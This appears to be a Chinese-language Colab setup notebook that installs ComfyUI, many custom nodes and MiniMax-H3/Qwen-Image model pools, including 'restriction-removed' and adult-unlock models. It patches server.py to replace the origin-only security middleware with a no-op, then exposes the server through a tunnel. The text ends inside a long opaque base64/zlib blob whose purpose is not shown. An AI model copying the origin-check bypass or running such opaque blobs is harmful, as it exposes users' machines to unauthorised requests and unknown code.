<div style="padding:16px 20px;border-radius:12px;background:linear-gradient(135deg,#1e1b4b,#311042);color:#fff;font-family:sans-serif;margin-bottom:12px;">
  <div style="font-size:22px;font-weight:800;margin-bottom:6px;">🎬 MiniMax-H3 &amp; 千问 Qwen-Image 2.1 全能工作台</div>
  <div style="font-size:13px;color:#cbd5e1;">📌 极简按需切换架构（用哪个只保留哪个配置 · 自动清理未选底模省空间 · 专属 LoRA 池与工作流池完全隔离）</div>
</div>

| 步骤卡片（单点对应 ▶️ 即可） | 核心底模与配置 | 专属隔离池（LoRA + 工作流） | 适用场景 |
| :--- | :--- | :--- | :--- |
| **1️⃣ 第一步：安装底座环境** | ComfyUI 核心 + 全部自定义节点 + 公共 VAE/放大器 | 初始化基础运行底座 | **每次新开机必点一次** |
| **2️⃣ 第二步：H3 文生+首尾帧视频** | `64G` 官方 FL2VA 底模 + 自选单款 CLIP | H3 视频池（9款LoRA + 16套H3工作流） | 文生音视频、首尾帧图生视频 |
| **3️⃣ 第三步：H3 全能参考视频** | `64G` 官方 Ref2VA / 8步极速 Omni 底模 | H3 视频池（9款LoRA + 16套H3工作流） | 多图/视频/音频全能参考、运镜控制 |
| **4️⃣ 第四步：C站 H3 Remix 社区版** | `64G` 社区二合一破限底模 + 未删减 CLIP | H3 视频池 + C站大人解锁池 | 社区微调、大人解锁、360环绕运镜 |
| **5️⃣ 第五步：H3 数字人 V4 专享** | 数字人专属配置 + 对口型/长视频扩展 | 数字人 V4 专属工作流 + H3 标准工作流 | 音频驱动数字人说话唱歌、多段长视频 |
| **6️⃣ 第六步：千问 Qwen-Image 2.1** | `13.6G` 标准/8步Turbo/**夜曲动漫破限**底模 | **千问专属池**（19款LoRA + 12套千问工作流） | 2K文生图、多图改图、超清放大、破限动漫 |
| **7️⃣ 第七步：独立重启网页与隧道** | 不删模型、不重下，秒级重启后端与隧道 | 保持当前已选模型池不变 | 网页断连重开、刷新获取全新免403链接 |


In [ ]:
# @title 🛠️ 1. 必备基础框架（开机点一次 · 极速并发装节点/VAE/放大器/LoRA池）
C站_API_Token = ""  # @param {type:"string"}
import os, subprocess, json, zlib, base64, urllib.request, time
from concurrent.futures import ThreadPoolExecutor

t0 = time.time()
print("🚀 [1/4] 正在极速初始化 ComfyUI 核心与 uv / aria2 加速引擎...")
os.chdir("/content")
if not os.path.exists("/content/ComfyUI/main.py"):
    subprocess.run(["git", "clone", "--depth", "1", "https://github.com/comfyanonymous/ComfyUI.git"], check=False)
os.chdir("/content/ComfyUI")

subprocess.run("apt-get -y install -qq aria2 >/dev/null 2>&1 & pip install -q uv", shell=True, check=False)
subprocess.run("uv pip install --system -q -r requirements.txt", shell=True, check=False)
subprocess.run("uv pip install --system -q huggingface_hub hf_transfer gguf librosa soundfile einops scipy torchvision torchaudio ultralytics opencv-python-headless rotary_embedding_torch omegaconf peft timm albumentations scikit-image matplotlib piexif numba blend_modes colour-science rembg onnxruntime", shell=True, check=False)

cm_path = "/content/ComfyUI/middleware/cache_middleware.py"
if os.path.exists(cm_path):
    open(cm_path, "w", encoding="utf-8").write("""from aiohttp import web
from typing import Callable, Awaitable
import os, io, gzip
from PIL import Image

IMG_EXTENSIONS = (".jpg", ".jpeg", ".png", ".ppm", ".bmp", ".pgm", ".tif", ".tiff", ".webp", ".woff", ".woff2", ".ttf", ".svg")
_OBJ_INFO_CACHE = {"key": None, "body": None, "ct": "application/json"}

def _model_state_key():
    parts = []
    for d in ("diffusion_models", "loras", "text_encoders", "vae", "latent_upscale_models", "checkpoints", "vae_approx"):
        p = f"/content/ComfyUI/models/{d}"
        if os.path.isdir(p):
            try:
                parts.append(",".join(sorted(os.listdir(p))))
            except Exception:
                pass
    cn = "/content/ComfyUI/custom_nodes"
    if os.path.isdir(cn):
        try:
            parts.append(",".join(sorted(os.listdir(cn))))
        except Exception:
            pass
    return "|".join(parts)

@web.middleware
async def cache_control(request: web.Request, handler: Callable[[web.Request], Awaitable[web.Response]]) -> web.Response:
    if request.path in ("/object_info", "/api/object_info"):
        k = _model_state_key()
        if _OBJ_INFO_CACHE["key"] == k and _OBJ_INFO_CACHE["body"] is not None:
            return web.Response(body=_OBJ_INFO_CACHE["body"], content_type=_OBJ_INFO_CACHE["ct"])
        resp = await handler(request)
        if resp.status == 200 and getattr(resp, "body", None):
            _OBJ_INFO_CACHE["key"] = k
            _OBJ_INFO_CACHE["body"] = bytes(resp.body)
        return resp
    if request.path in ("/view", "/api/view") and not request.query.get("raw"):
        fn = request.query.get("filename", "")
        ftype = request.query.get("type", "output")
        sub = request.query.get("subfolder", "").strip("/")
        if fn.lower().endswith(".png") and ftype in ("output", "input", "temp"):
            base = f"/content/ComfyUI/{ftype}"
            fpath = os.path.join(base, sub, fn) if sub else os.path.join(base, fn)
            if os.path.isfile(fpath):
                try:
                    with Image.open(fpath) as im:
                        buf = io.BytesIO()
                        im.save(buf, format="WEBP", quality=85, method=1)
                        return web.Response(body=buf.getvalue(), content_type="image/webp", headers={"Cache-Control": "public, max-age=86400"})
                except Exception:
                    pass
    response: web.Response = await handler(request)
    if request.path.startswith("/extensions/"):
        response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
        return response
    if request.path.startswith("/assets/"):
        response.headers["Cache-Control"] = "public, max-age=604800, immutable"
    elif request.path.lower().endswith(IMG_EXTENSIONS) and response.status == 200:
        response.headers.setdefault("Cache-Control", "public, max-age=86400")
    if (
        isinstance(response, web.Response)
        and not isinstance(response, web.FileResponse)
        and getattr(response, "body", None)
        and isinstance(response.body, (bytes, bytearray))
        and len(response.body) > 2048
        and "Content-Encoding" not in response.headers
        and "gzip" in request.headers.get("Accept-Encoding", "")
    ):
        response.body = gzip.compress(bytes(response.body), compresslevel=5)
        response.headers["Content-Encoding"] = "gzip"
        response.headers["Content-Length"] = str(len(response.body))
    return response
""")

s_path = "/content/ComfyUI/server.py"
if os.path.exists(s_path):
    txt = open(s_path, "r", encoding="utf-8").read()
    if "_noop" not in txt:
        txt = txt.replace(
            "def create_origin_only_middleware():",
            "def create_origin_only_middleware():\n    from aiohttp import web\n    @web.middleware\n    async def _noop(request, handler):\n        return await handler(request)\n    return _noop\ndef _old_origin():"
        )
        open(s_path, "w", encoding="utf-8").write(txt)

print(f"🧩 [2/4] 正在 16 线程并发克隆 27 个自定义节点插件 (已耗时 {int(time.time()-t0)}s)...")
os.makedirs("/content/ComfyUI/custom_nodes", exist_ok=True)
plugins = [
    ("ComfyUI-Manager", "https://github.com/ltdrdata/ComfyUI-Manager.git"),
    ("ComfyUI-MiniMaxH3-Easy", "https://github.com/nkxx188/ComfyUI-MiniMaxH3-Easy.git"),
    ("ComfyUI-FeiHou-Easy-H3", "https://github.com/FX-FeiHou/ComfyUI-FeiHou-Easy-H3.git"),
    ("ComfyUI-FeiHou-Toolbox", "https://github.com/FX-FeiHou/ComfyUI-FeiHou-Toolbox.git"),
    ("ComfyUI-VideoHelperSuite", "https://github.com/Kosinkadink/ComfyUI-VideoHelperSuite.git"),
    ("ComfyUI-KJNodes", "https://github.com/kijai/ComfyUI-KJNodes.git"),
    ("ComfyUI-Easy-Use", "https://github.com/yolain/ComfyUI-Easy-Use.git"),
    ("rgthree-comfy", "https://github.com/rgthree/rgthree-comfy.git"),
    ("ComfyUI-LTXVideo", "https://github.com/Lightricks/ComfyUI-LTXVideo.git"),
    ("Comfyui_Minimax_h3_latent_Upscaler", "https://github.com/LBH-123-AI/Comfyui_Minimax_h3_latent_Upscaler.git"),
    ("ComfyUI-AusBoss", "https://github.com/ausboss/ComfyUI-AusBoss.git"),
    ("comfyui-SelfLift", "https://github.com/facok/comfyui-SelfLift.git"),
    ("ComfyUI-MiniMaxH3-TimelineDirector", "https://github.com/Songssx/ComfyUI-MiniMaxH3-TimelineDirector.git"),
    ("Goohaitools-comfyui", "https://github.com/goohai/Goohaitools-comfyui.git"),
    ("ComfyUI_essentials", "https://github.com/cubiq/ComfyUI_essentials.git"),
    ("ComfyUI_LayerStyle", "https://github.com/chflame163/ComfyUI_LayerStyle.git"),
    ("ComfyUI-Impact-Pack", "https://github.com/ltdrdata/ComfyUI-Impact-Pack.git"),
    ("comfyui_controlnet_aux", "https://github.com/Fannovel16/comfyui_controlnet_aux.git"),
    ("ComfyUI-Inpaint-CropAndStitch", "https://github.com/lquesada/ComfyUI-Inpaint-CropAndStitch.git"),
    ("ComfyUI_AdvancedRefluxControl", "https://github.com/kaibioinfo/ComfyUI_AdvancedRefluxControl.git"),
    ("ComfyUI_ZenID", "https://github.com/vuongminh1907/ComfyUI_ZenID.git"),
    ("ComfyUI-SDPose-OOD", "https://github.com/judian17/ComfyUI-SDPose-OOD.git"),
    ("Comfy-Canvas", "https://github.com/Zlata-Salyukova/Comfy-Canvas.git"),
    ("ComfyUI-qwenmultiangle", "https://github.com/jtydhr88/ComfyUI-qwenmultiangle.git"),
    ("ComfyUI-H3-Context-Noise", "https://github.com/Beijinren/ComfyUI-H3-Context-Noise.git"),
    ("ComfyUI-H3-Motion-Context", "https://github.com/NikoDemon80/ComfyUI-H3-Motion-Context.git"),
    ("ComfyUI-SeedVR2_VideoUpscaler", "https://github.com/numz/ComfyUI-SeedVR2_VideoUpscaler.git"),
]

def _clone_one(item):
    name, repo = item
    dst = f"/content/ComfyUI/custom_nodes/{name}"
    if not os.path.exists(dst):
        subprocess.run(["git", "clone", "--depth", "1", "-q", repo, dst], check=False)

with ThreadPoolExecutor(max_workers=16) as ex:
    list(ex.map(_clone_one, plugins))

ROBOT_NATIVE_B64 = "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